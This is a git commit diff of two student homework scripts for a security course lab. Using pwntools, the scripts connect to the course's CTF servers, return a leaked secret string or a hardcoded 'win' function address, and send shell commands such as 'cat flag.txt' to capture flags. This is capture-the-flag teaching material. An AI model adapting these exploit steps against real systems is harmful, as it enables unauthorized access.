6d408cc69b07ef113eef00a1b18e505a792413e0
Kevin Wafula <95890992+kwafula@users.noreply.github.com>
2023-09-04 06:53:05 -0400

    Add files via upload

--- Homework-01/lab1-1.py
+++ Homework-01/lab1-1.py
@@ -4,21 +4,31 @@ from pwn import *
 # p = processs("./lab1-1.bin")
 
 # connect to remote server process at port 7011
+print("")
 p = remote("csc748.hostbin.org", 7011)
 
 # read data upto secret string
 p.recvuntil(b"\n\n")
 
-# get and print secret string 
+# get and print secret string
 s = p.recv(15)
 print(f"The secret string was: {s}")
 
 # send back secret string
 p.sendline(s)
+print("")
 
-# establish interactive session 
+# print flag.txt
+p.sendline(b'echo "Listing and printing the flag [+][+][+][+][+]"')
+p.sendline(b'echo ""')
+p.sendline(b'ls -alh')
+p.sendline(b'echo "";')
+p.sendline(b'cat flag.txt')
+p.sendline(b'echo ""')
+
+# establish interactive session
 p.interactive()
 
-# add code to print flag.txt
 
-# Flag fetched is: flag{28ad309117e29e7f87a9e7ec231f8348}
+
+
--- Homework-01/lab1-2.py
+++ Homework-01/lab1-2.py
@@ -4,26 +4,46 @@ import os
 # connect to local binary process
 # p = processs("./lab1-2.bin")
 
-# connect to remote server process at port 7011
+# hardcoded win function address
+winFuncAddrDecimal = 4199183
+
+winFuncAddrHex = hex(winFuncAddrDecimal)
+#print(type(winFuncAddrHex)) # Testing code
+
+winFuncAddrBytes = bytes(str(winFuncAddrDecimal), "utf-8")
+#print(type(winFuncAddrBytes)) # Testing code
+
+# connect to remote server process at port 7012
+print("")
 p = remote("csc748.hostbin.org", 7012)
 
 # read response
-response = p.recvline()
+response = p.recvuntil(b'\n').decode('utf-8')
 
 # print response
 # s = p.recv(15)
-print(f"The secret string was: {response}")
+print(f"{response}")
 
+# print win function addresses
+print(f'The addres of "win" function in hex is: {winFuncAddrHex}')
+print("")
+print(f'The addres of "win" function in decimal is: {winFuncAddrDecimal}')
+print("")
+print(f'The addres of "win" function in bytes is: {winFuncAddrBytes}')
+
+print("")
 # send back hardcoded address of "win" fiction in decimal
 # "win" function address is 0x40130f or 4199183 in decimal
-p.sendline(4199183)
-
-# establish interactive session 
-p.interactive()
+print('Calling "win" function [+][+][+][+][+][+][+][+]')
+p.sendline(winFuncAddrBytes)
 
 # print flag.txt
-# Flag to fetched is: flag{082f90215133f4755f27ec6850b1eecc}
-os.system("cat flag.txt")
-
-
-
+p.sendline(b'echo ""')
+p.sendline(b'echo "Listing and printing the flag [+][+][+][+][+]"')
+p.sendline(b'echo ""')
+p.sendline(b'ls -alh')
+p.sendline(b'echo "";')
+p.sendline(b'cat flag.txt')
+p.sendline(b'echo ""')
+# establish interactive session
+p.interactive()
